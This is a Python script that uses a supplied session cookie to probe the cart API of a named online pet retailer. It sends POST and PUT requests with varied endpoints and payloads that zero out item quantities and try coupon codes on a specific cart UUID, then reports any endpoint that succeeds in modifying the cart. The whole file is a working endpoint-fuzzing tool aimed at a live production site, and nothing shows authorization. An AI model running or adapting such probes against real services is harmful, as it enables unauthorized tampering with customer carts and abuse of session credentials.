#!/usr/bin/env python3
"""
Final cart modification test - try all possible combinations
Based on HTTP 405 response, endpoint exists but method may be wrong
"""

import requests
import json
import sys

BASE_URL = "https://www.zooplus.de"
CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
ARTICLE_ID = 2966422
OFFER_ID = "1P.2966422"  # From cart response

SESSION_COOKIE = sys.argv[1] if len(sys.argv) > 1 else None

if not SESSION_COOKIE:
    print("[!] Usage: python3 test_cart_modify_final.py <session_cookie>")
    sys.exit(1)

headers = {
    "Cookie": SESSION_COOKIE,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

print(f"[*] Final cart modification test")
print(f"[*] Cart UUID: {CART_UUID}")
print()

# Get cart to extract offerId
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code != 200:
    print(f"[!] Failed to read cart: {r.status_code}")
    sys.exit(1)

cart = r.json()
before_count = len(cart.get("articles", []))
before_total = cart.get("summary", {}).get("grandTotal", 0)
print(f"[+] Cart has {before_count} items, total: {before_total} EUR")

# Get offerId from first article
first_article = cart.get("articles", [{}])[0]
offer_id = first_article.get("offerId", "")
print(f"[+] First article offerId: {offer_id}")
print()

# Try all possible combinations
endpoints = [
    # Using offerId instead of articleId
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles", {
        "articles": [{"offerId": offer_id, "quantity": 0}]
    }),
    ("PUT", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles", {
        "articles": [{"offerId": offer_id, "quantity": 0}]
    }),
    
    # Using articleId with offerId
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles", {
        "articles": [{"id": ARTICLE_ID, "offerId": offer_id, "quantity": 0}]
    }),
    
    # Try with shopId
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles", {
        "articles": [{"shopId": first_article.get("shopId"), "quantity": 0}]
    }),
    
    # Try different endpoint structures
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/update", {
        "articles": [{"id": ARTICLE_ID, "quantity": 0}]
    }),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/set", {
        "articles": [{"id": ARTICLE_ID, "quantity": 0}]
    }),
    
    # Try coupon with different structures
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/coupon", {"couponCode": "TEST"}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/coupon", {"code": "TEST", "cartId": cart.get("cartId")}),
]

successful = []

for method, endpoint, payload in endpoints:
    print(f"[*] {method} {endpoint}")
    print(f"    Payload: {json.dumps(payload)}")
    
    try:
        if method == "PUT":
            r = requests.put(f"{BASE_URL}{endpoint}", headers=headers, json=payload, timeout=10)
        else:
            r = requests.post(f"{BASE_URL}{endpoint}", headers=headers, json=payload, timeout=10)
        
        print(f"    HTTP {r.status_code}")
        
        if r.status_code in [200, 204]:
            print(f"    [!!!] SUCCESS!")
            print(f"    Response: {r.text[:300]}")
            successful.append((method, endpoint, payload, r.status_code, r.text[:500]))
        elif r.status_code == 400:
            print(f"    [!] Bad Request: {r.text[:200]}")
            # 400 might mean endpoint exists but payload is wrong
        elif r.status_code == 405:
            print(f"    [!] Method Not Allowed (endpoint exists!)")
        elif r.status_code == 404:
            print(f"    [X] Not found")
        else:
            print(f"    Response: {r.text[:200]}")
    except Exception as e:
        print(f"    Error: {e}")

print()
print("[*] Verifying cart...")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code == 200:
    cart_after = r.json()
    after_count = len(cart_after.get("articles", []))
    after_total = cart_after.get("summary", {}).get("grandTotal", 0)
    print(f"[+] Cart now: {after_count} items, {after_total} EUR")
    
    if before_count != after_count or abs(before_total - after_total) > 0.01:
        print()
        print("[!!!] ========================================")
        print("[!!!] CART WAS MODIFIED!")
        print("[!!!] ========================================")
        print(f"[!!!] Before: {before_count} items, {before_total} EUR")
        print(f"[!!!] After:  {after_count} items, {after_total} EUR")

if successful:
    print()
    print("[!!!] WORKING ENDPOINTS FOUND:")
    for method, endpoint, payload, status, response in successful:
        print(f"[!!!] {method} {endpoint}")
        print(f"      Payload: {json.dumps(payload)}")
        print()

